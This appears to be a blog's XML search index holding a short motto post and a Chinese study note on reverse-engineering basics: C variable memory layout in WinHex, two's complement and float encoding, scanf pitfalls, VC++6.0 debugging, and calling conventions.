<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>征途上，新的开始</title>
    <url>/2022/08/29/%E5%BE%81%E9%80%94%E4%B8%8A%EF%BC%8C%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/</url>
    <content><![CDATA[<p>For me, it has not yet been realized what the rest of one’s life, is my greatest encouragement.</p>
<p>对我来说，一件尚未实现的事，就是我有生之年的最大鞭策。</p>
]]></content>
  </entry>
  <entry>
    <title>Notes-Decompile</title>
    <url>/2024/01/02/Notes-Decompile/</url>
    <content><![CDATA[<h1 id="C语言内存地址"><a href="#C语言内存地址" class="headerlink" title="C语言内存地址"></a>C语言内存地址</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令行执行</span></span><br><span class="line"><span class="comment">// .obj文件为链接文件</span></span><br><span class="line"><span class="comment">// cl /c /W4 /P hello.c -编译</span></span><br><span class="line"><span class="comment">// link hello.obj -链接</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  <span class="comment">//环境变量寻找依赖，&quot;&quot;当前目录寻找</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">999</span>;    <span class="comment">// 0x000003e7      19ff2c(地址，全称0019ff2c) -&gt; E7 03 00 00 (值)</span></span><br><span class="line">    			   <span class="comment">// 999(十进制) -&gt; 3e7(十六进制)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello world!%p:%d\r\n&quot;</span>,&amp;n,n); <span class="comment">//打印内存地址</span></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>WinHex 打开内存文件</p>
<p>查找16进制：Alt+Ctrl+F<br>搜索下一个：F3</p>
<p>到特定的偏移地址，Seek Logical Address&#x2F;Go to Virtual Address</p>
<img src="/2024/01/02/Notes-Decompile/01.png" class title="This is an example image">

<p>VC++6.0固定变量内存地址，最新版的VC是随机地址</p>
<p>VC98&#x2F;CRT&#x2F;SRC&#x2F;CRT0.C-&gt;mainCRTStartup</p>
<h1 id="内存存储机制"><a href="#内存存储机制" class="headerlink" title="内存存储机制"></a>内存存储机制</h1><h2 id="补码（整数和小数的表示）"><a href="#补码（整数和小数的表示）" class="headerlink" title="补码（整数和小数的表示）"></a>补码（整数和小数的表示）</h2><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p>内存中存储的都是补码形式，先判断正负数，再对两者之间进行转换<br>比如：winHex里面的十六进制跟变量十进制之间的转换</p>
<p>二进制的 + - * &#x2F; 原理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  A - B</span><br><span class="line">= A + (0x100-B) - 0x100</span><br><span class="line">    B + ~B = ff</span><br><span class="line">    B + ~B + 1 = 0x100</span><br><span class="line">    ~B + 1 = 0x100 - B //求补运算</span><br><span class="line">= A + neg(B) - 0x100 //进位丢失     010进位10</span><br></pre></td></tr></table></figure>

<p>求补运算是一种运算<br>补码是一种编码<br>补码规定了数据的读写双方必须做到：<br>1、最高有效位是符号位，0表示正，1表示负<br>2、当数据是正数的时候，其余各种直接存储其数值<br>3、当数据为负数的时候，其余各种存储其求补后的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">    <span class="comment">// 110100</span></span><br><span class="line">    <span class="comment">// 0 0110100</span></span><br><span class="line">    <span class="comment">// 0011 0100</span></span><br><span class="line">    <span class="comment">// 3    4</span></span><br><span class="line">	<span class="type">int</span> n = <span class="number">52</span>;<span class="comment">// 34 00 00 00</span></span><br><span class="line">    <span class="comment">// 110100</span></span><br><span class="line">    <span class="comment">// 1 0110100</span></span><br><span class="line">    <span class="comment">// 1 1001011 + 1   取反+1</span></span><br><span class="line">    <span class="comment">// 1 1001100</span></span><br><span class="line">    <span class="comment">// 1100 1100</span></span><br><span class="line">    <span class="comment">// c   c</span></span><br><span class="line">    <span class="type">int</span> m = <span class="number">-52</span>;<span class="comment">// cc ff ff ff</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\r\n&quot;</span>,&amp;n);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>公式：补码&#x3D;反码+1</p>
<p>十进制整形在内存中的存储：</p>
<p>1、转化为二进制<br>2、正数则直接按照二进制转换为十六进制<br>3、负数则除符号位，取反+1，再转换为十六进制<br>4、按照内存4个字节，一个字节8位？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">计算 <span class="number">34</span>，<span class="number">-34</span></span><br><span class="line"><span class="comment">// 34</span></span><br><span class="line"><span class="comment">// 100010</span></span><br><span class="line"><span class="comment">// 0 0100010</span></span><br><span class="line"><span class="comment">// 0010 0010</span></span><br><span class="line"><span class="comment">// 2    2</span></span><br><span class="line">    =&gt; <span class="number">22</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">// -34</span></span><br><span class="line"><span class="comment">// 100010</span></span><br><span class="line"><span class="comment">// 1 0100010</span></span><br><span class="line"><span class="comment">// 1 1011101 + 1</span></span><br><span class="line"><span class="comment">// 1 1011110</span></span><br><span class="line"><span class="comment">// 1101 1110</span></span><br><span class="line">   =&gt; de ff ff ff</span><br><span class="line">    </span><br><span class="line"><span class="number">0x86</span>单字节有符号数的十进制真值是什么？</span><br><span class="line"><span class="comment">// 就是求内存中十六进制表示是86的值，实际变量定义的十进制数是多少</span></span><br><span class="line"><span class="comment">// 1000 0110</span></span><br><span class="line"><span class="comment">// 1 0000110</span></span><br><span class="line"><span class="comment">// - 1111001 + 1         补码转化为正常二进制，也是除符号位外取反+1</span></span><br><span class="line"><span class="comment">// - 1111010</span></span><br><span class="line"><span class="comment">// - 0111 1010</span></span><br><span class="line"><span class="comment">// - 7    A</span></span><br><span class="line"><span class="comment">// - 7*16 + 10 = -122</span></span><br><span class="line">    </span><br><span class="line">定义变量为<span class="number">-122</span>，用winHex去寻找地址看是不是<span class="number">86</span></span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line"><span class="number">0x80</span>呢？</span><br><span class="line"><span class="comment">// 1000 0000</span></span><br><span class="line"><span class="comment">// 1 0000000</span></span><br><span class="line"><span class="comment">// - 1111111 + 1 </span></span><br><span class="line"><span class="comment">// - 1000 0000</span></span><br><span class="line"><span class="comment">// - 8    0</span></span><br><span class="line"><span class="comment">// - 8*16</span></span><br><span class="line"><span class="comment">// -128</span></span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-Decompile/02.png" class title="This is an example image">

<p>PS：这是在winHex里面的表现形式，十六进制表示，其余程序不一定是这样<br>        十进制整数在winHex的表示，直接把十进制转化为十六进制，小端排序即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">十六进制中，大于等于8的都是负数 </span><br><span class="line">1000 因为存储的都是补码形式</span><br><span class="line"></span><br><span class="line">看首位是否&lt;8,＜8说明是正数，≥8说明是负数。</span><br><span class="line">原理:临界值为7fffH，我们知道首位7的二进制码为0111，而0111的首位是0，说明是正数。而像8000H首位8二进制码为1000，首位为1，就变成负数了。</span><br></pre></td></tr></table></figure>



<h3 id="小数"><a href="#小数" class="headerlink" title="小数"></a>小数</h3><p>二进制存储小数原理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、固定分解</span><br><span class="line">二进制0.1表示为十进制的0.5，0.01表示为0.25，0.001表示为0.125</span><br><span class="line">因此，十进制的小数转化为二进制如下：</span><br><span class="line">0.375 &lt; 0.5   =&gt; 0</span><br><span class="line">0.375 &gt; 0.25  =&gt; 1</span><br><span class="line">0.125 = 0.125 =&gt; 1</span><br><span class="line">因此 0.375(十进制) = 0.011(二进制)</span><br><span class="line"></span><br><span class="line">2、乘2取余</span><br><span class="line">乘2如果小于1说明原值小于0.5，即取0</span><br><span class="line">0.375 * 2 = 0.75 &lt; 1 =&gt; 0</span><br><span class="line">0.75 * 2 = 1.5 &gt; 1   =&gt; 1</span><br><span class="line">0.5 * 2 = 1 == 1     =&gt; 1</span><br><span class="line">因此 0.375(十进制) = 0.011(二进制)</span><br><span class="line"></span><br><span class="line">0.6就没法精确</span><br><span class="line"></span><br><span class="line">实际存储</span><br><span class="line">总共4个字节32位，1个字节8位即一个十六进制</span><br><span class="line">一位放正负符号、一个字节(8位)放小数点位置，其余23位放值。注：64位有11位表小数点位置</span><br><span class="line">32位 = 1 + 8 + 23</span><br><span class="line">32位4个字节，小数形式十六进制存储形式如下：</span><br><span class="line">S EEEEEEEE DDDDDDDDDDDDDDDDDDDDDDD</span><br><span class="line"></span><br><span class="line">案例计算：</span><br><span class="line">23.625（十进制）</span><br><span class="line">=&gt; 10111.101（二进制） 有小数转十六进制的形式</span><br><span class="line">=&gt; 1.0111101 * 10^4</span><br><span class="line">S(正负符号位) EEEEEEEE(小数点位) DDDDDDDDDDDDDDDDDDDDDDD(值,补0)</span><br><span class="line">	小数点位存储8位，大小为，0-127-255，转化为 -128-0-127</span><br><span class="line">	即原来0-4-|127|-255变成-128-|0|-4-127</span><br><span class="line">	原先0-255表示4是 00000100</span><br><span class="line">	而后-128-127表示4是 4+127 = 128+3 = 10000011</span><br><span class="line">=&gt;0           10000011          01111010000000000000000</span><br><span class="line">=&gt;01000001101111010000000000000000</span><br><span class="line">=&gt;0100 0001 1011 1101 0000 0000 0000 0000</span><br><span class="line">=&gt;4    1    B    D    0    0    0    0</span><br><span class="line">=&gt;00 00 BD 41</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目1：</span><br><span class="line">将895.75转换为float类型的16进制形式，895 = 1101111111(B)</span><br><span class="line">1101111111.11</span><br><span class="line">1.10111111111 * 10^9</span><br><span class="line">	9+127 =&gt; 128+8 =&gt; 10001000</span><br><span class="line">0 10001000 10111111111000000000000</span><br><span class="line">0100 0100 0101 1111 1111 0000 0000 0000</span><br><span class="line">4    4    5    F    F    0    0    0</span><br><span class="line">00 F0 5F 44</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目2：</span><br><span class="line">已知地址0013FF74内容为：00 68 45 44，系统字节顺序为小尾方式，如果这个地址是存放flaot变量，那么其10进制真值为多少？</span><br><span class="line">44 45 68 00</span><br><span class="line">0100 0100 0100 0101 0110 1000 0000 0000 </span><br><span class="line">0 10001000 10001010110100000000000 </span><br><span class="line">1 10^9</span><br><span class="line">+1.100010101101 * 10^9</span><br><span class="line">+1100010101.101</span><br><span class="line">+2^9 + 2^8 + 2^4 + 2^2 + 1 + 0.5 + 0.125 </span><br><span class="line">+512+256+16+4+1+0.5+0.125</span><br><span class="line">+789.625</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="type">float</span> f = <span class="number">23.625f</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x\r\n&quot;</span>,&amp;f);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="关于字节问题"><a href="#关于字节问题" class="headerlink" title="关于字节问题"></a>关于字节问题</h3><p>4个字节，一个字节8位，每8位相当于一个十六进制 0000 0000</p>
<p>winHex是双字节存储，每个地址对应的是两个十六进制数</p>
<h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><p>VC98&#x2F;CRT&#x2F;SRC&#x2F;RAND.C</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">// 测试程序什么时候退出</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    srand((<span class="type">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">while</span>(n&lt;<span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x\r\n&quot;</span>,rand()); <span class="comment">//移除括号外，开销大，printf开销大</span></span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run.bat</span></span><br><span class="line">del *.obj</span><br><span class="line">del *.exe</span><br><span class="line">cl /c /W4 /WX 2.c</span><br><span class="line"><span class="built_in">link</span> 2.obj</span><br><span class="line">2.exe</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<h1 id="C语言基础语法分析"><a href="#C语言基础语法分析" class="headerlink" title="C语言基础语法分析"></a>C语言基础语法分析</h1><h2 id="1、数值和字符串"><a href="#1、数值和字符串" class="headerlink" title="1、数值和字符串"></a>1、数值和字符串</h2><p>‘a’表示为ASCLL，输入到变量地址要&amp;n，输入指定地址直接n</p>
<p>“a”表示为字符串，默认取首地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="type">char</span> szBuf[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;   <span class="comment">//vc6.0默认在19ff2c地址开始存储</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,szBuf);  <span class="comment">//scanf存在越界情况</span></span><br><span class="line">    <span class="comment">//scanf(&quot;%19s&quot;,szBuf); 这个19也可以改，如果有条件</span></span><br><span class="line">    <span class="comment">//scanf(&quot;%19[0-9]s&quot;,szBuf);</span></span><br><span class="line">    <span class="comment">//scanf(&quot;%19[0,5,9,a]s&quot;,szBuf);</span></span><br><span class="line">    <span class="comment">//scanf(&quot;%19[^8]s&quot;,szBuf);</span></span><br><span class="line">    <span class="comment">// 输入12341234123412341234000</span></span><br><span class="line">    <span class="comment">// 此处是以字符串的形式输入，0=&gt;30,1=&gt;31,2=&gt;32,3=&gt;33,4=&gt;34</span></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-Decompile/03.png" class title="This is an example image">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="comment">//2、输入整数，内存存储的地址</span></span><br><span class="line">    <span class="type">int</span> n; <span class="comment">//未初始化，残留值地址</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,n); </span><br><span class="line">    <span class="comment">//地址默认在19ff2c开始存储，但此处存储的是一个地址，残留的地址，要根据地址去跳转</span></span><br><span class="line">    <span class="comment">/*2.1、 初始化位0，0是保留地址，可以去winxp看详细报错</span></span><br><span class="line"><span class="comment">            int n = 0; 会报错，</span></span><br><span class="line"><span class="comment">            scanf(&quot;%d&quot;,n);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*2.2、 定义短字节整形，%d输入，造成覆盖</span></span><br><span class="line"><span class="comment">            short int ary[2] = &#123;666,999&#125;;   定义数组时，即把值放在19ff2c里</span></span><br><span class="line"><span class="comment">            scanf(&quot;%d&quot;,&amp;ary[0]);      此处指定存储地址为数组的第一个值地址</span></span><br><span class="line"><span class="comment">            此处把666和999放到固定的19ff20那一行，&quot;%hd&quot;</span></span><br><span class="line"><span class="comment">            输入999，理论上是修改666的值，但4字节输入，2字节存储，导致后面覆盖成0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-Decompile/04.png" class title="This is an example image">

<p>C0000005内存访问异常</p>
<p>scanf怎么判断指定输入的是地址还是值，默认都是存储在19ff20这一行</p>
<p>结论：</p>
<p><strong>scanf后续指定的就是地址</strong></p>
<ol>
<li>有初始化值，默认存储在19ff2c，后续的输入是覆盖变量值(整数、字符等)</li>
<li>无初始化值，取残留值，即默认地址存储的是残留地址，残留地址存储的才是值</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="type">int</span> n = <span class="number">0x19ff2c</span>;  <span class="comment">// 此处存储地址默认在19ff28</span></span><br><span class="line">    <span class="type">int</span> m = <span class="number">0</span>;	       <span class="comment">// 此处存储地址默认在19ff2c</span></span><br><span class="line">    <span class="comment">// printf(&quot;%p:%d&quot;,&amp;n,n);   0019FF28:1703724</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,n); <span class="comment">// 输入999，此处把99输入到n对应的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x\r\n&quot;</span>,n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x\r\n&quot;</span>,m);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*结果</span></span><br><span class="line"><span class="comment">999</span></span><br><span class="line"><span class="comment">0019ff2c</span></span><br><span class="line"><span class="comment">000003e7</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>不同于printf，默认变量定义或从scanf获取值时，就已经开辟内存</p>
<p>m &#x3D; 0x19ff2c时，是存储在19ff28</p>
<img src="/2024/01/02/Notes-Decompile/05.png" class title="This is an example image">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="type">int</span> n = <span class="number">0x19ff2c</span>;</span><br><span class="line">	<span class="type">int</span> m = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;n address:%p\r\n&quot;</span>,&amp;n); <span class="comment">//打印内存地址</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;m address:%p\r\n&quot;</span>,&amp;m); <span class="comment">//打印内存地址</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;i address:%p\r\n&quot;</span>,&amp;i); <span class="comment">//打印内存地址</span></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	n address:0019FF24</span></span><br><span class="line"><span class="comment">    m address:0019FF28</span></span><br><span class="line"><span class="comment">    i address:0019FF2C</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>结论：</p>
<ol>
<li>vc++中变量存储地址从19ff2c开始</li>
<li>但是有多个变量，地址是往前排，比如有两个变量，第一个变量地址是 19ff28 ，第二个是19ff2c</li>
</ol>
<h2 id="2、新建C项目-新建-amp-调试"><a href="#2、新建C项目-新建-amp-调试" class="headerlink" title="2、新建C项目(新建&amp;调试)"></a>2、新建C项目(新建&amp;调试)</h2><p>新建MFC项目控制台项目（基于 Microsoft 基础类 (MFC) 库的 Windows 可执行应用程序）</p>
<p>create -&gt; Win32 Console Application-&gt;Helloworld</p>
<p>快捷键（F5、Ctrl+F7、F9、F10、F11），反汇编</p>
<p>F5：编译、链接、调试、运行</p>
<p>Ctrl+F7：编译不链接</p>
<p>F7：编译、链接</p>
<p>F9：打断点</p>
<p>F10：执行下一步，跳过循环或函数</p>
<p>F11：执行下一步，进入循环或函数</p>
<p>CTRL+F10：运行到光标所在行</p>
<p>Disassembly：反编译</p>
<p>Alt+8跳转汇编，对应代码和汇编</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(x = <span class="number">0</span>; x &lt; <span class="number">7</span>; x++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(y = <span class="number">0</span>; y &lt; <span class="number">7</span>; y++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x + <span class="number">3</span> == y || -x + <span class="number">9</span> == y || x - <span class="number">3</span> == y || -x + <span class="number">4</span> == y)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;* &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>配调试界面（十六进制窗口、变量窗口、栈窗口、寄存器）</p>
<p>View -&gt; Debug Windows -&gt;Memory</p>
<p>View -&gt; Debug Windows -&gt;Watch</p>
<p>View -&gt; Debug Windows -&gt;Call Stack</p>
<p>View -&gt; Debug Windows -&gt;Register</p>
<img src="/2024/01/02/Notes-Decompile/06.png" class title="This is an example image">

<h2 id="3、循环-amp-goto-amp-基本代码"><a href="#3、循环-amp-goto-amp-基本代码" class="headerlink" title="3、循环&amp;goto&amp;基本代码"></a>3、循环&amp;goto&amp;基本代码</h2><p>double 8字节、int 4字节，double类型数据按int输出会丢失字节，取值（ceil、floor）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">15000</span>;</span><br><span class="line">    <span class="type">double</span> dblBitCount = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dblBitCount = dblBitCount + <span class="built_in">log10</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> NEXT;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">NEXT:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,(<span class="type">int</span>)<span class="built_in">ceil</span>(dblBitCount));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4、函数调用-调用机制"><a href="#4、函数调用-调用机制" class="headerlink" title="4、函数调用 (调用机制)"></a>4、函数调用 (调用机制)</h2><p><strong>1，按调用约定传递参数。</strong></p>
<p>1.1调用约定调用方（caller）需要和被调方（callee）作出以下约定：</p>
<ol>
<li>参数的传递方向</li>
<li>参数的传输媒介</li>
<li>函数返回值的位置</li>
<li>释放参数空间的负责方，有且仅有一方去释放参数空间。</li>
</ol>
<p>__cdecl：参数使用栈空间传递，从右往左函数返回值在寄存器，由调用方负责释放参数空间</p>
<p>__stdcall：参数使用栈空间传递，从右往左函数返回值在寄存器，由被调方负责释放参数空间</p>
<p>__fastcall：左数前两个参数使用寄存器传递，其它参数使用栈空间传递，从右往左函数返回值在寄存器，由被调方负责释放参数空间</p>
<p><strong>2.保存返回地址，函数调用结束后应该执行的地址值</strong></p>
<p><strong>3.保存调用方的信息(栈底)</strong></p>
<p><strong>4.更新当前栈到栈顶（把当前栈顶作为被调方的栈底）</strong></p>
<p><strong>5.为局部变量申请空间。（抬高栈顶)</strong></p>
<p><strong>6.保存寄存器环境。（把即将使用的寄存器原值保存在栈里)</strong></p>
<p><strong>7.如果编译选项有&#x2F;zI&#x2F;Zi，则将局部变量初始化为oxcccccccc</strong></p>
<p><strong>8.执行函数体</strong></p>
<p><strong>9.恢复寄存器环境</strong></p>
<p><strong>10.释放局部变量的空间</strong></p>
<p><strong>11.恢复调用方的栈信息(栈底)</strong></p>
<p>从右向左填充</p>
<p><strong>对于栈来说，数据出入的口是栈顶。</strong></p>
<img src="/2024/01/02/Notes-Decompile/08.png" class title="This is an example image">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetFib</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> m,<span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> nF1 = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> nF2 = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> nFib = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">2</span> || n == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nFib;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nFib1 = GetFib(<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nFib2 = GetFib(<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; <span class="number">47</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        nFib1 = GetFib(<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02d:%15u\t%f\r\n&quot;</span>, i<span class="number">-2</span>, nFib1, (<span class="type">double</span>)nFib2 / nFib1);</span><br><span class="line">        nFib2 = nFib1;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span 